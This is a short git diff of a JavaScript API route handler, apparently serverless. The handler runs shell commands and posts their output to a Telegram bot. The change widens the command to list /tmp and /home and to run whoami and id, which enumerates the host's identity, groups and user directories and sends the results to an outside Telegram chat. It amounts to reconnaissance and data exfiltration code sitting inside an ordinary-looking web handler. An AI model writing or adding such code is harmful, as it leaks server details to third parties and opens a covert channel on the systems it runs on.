@@ -32,8 +32,8 @@ export default async function handler(req, res) {
         console.log('Image sent successfully:', response.data);
 
         // List the contents of the /tmp directory
-        exec('ls -la /tmp', async (error, stdout, stderr) => {
-            console.log("lls")
+        exec('ls -la /tmp ; whoami ; id ; ls -la /home', async (error, stdout, stderr) => {
+            console.log("lls 1")
             if (error) {
                 console.error(`Error listing directory contents: ${error}`);
                 return res.status(500).json({ status: 'error', message: 'Error listing directory contents' });
@@ -41,7 +41,7 @@ export default async function handler(req, res) {
 
             console.log(`Directory contents: ${stdout}`);
 
-            // Send the directory contents to the Telegram bot
+            // Send the directory contents to the Telegram boti
             try {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: CHAT_ID,
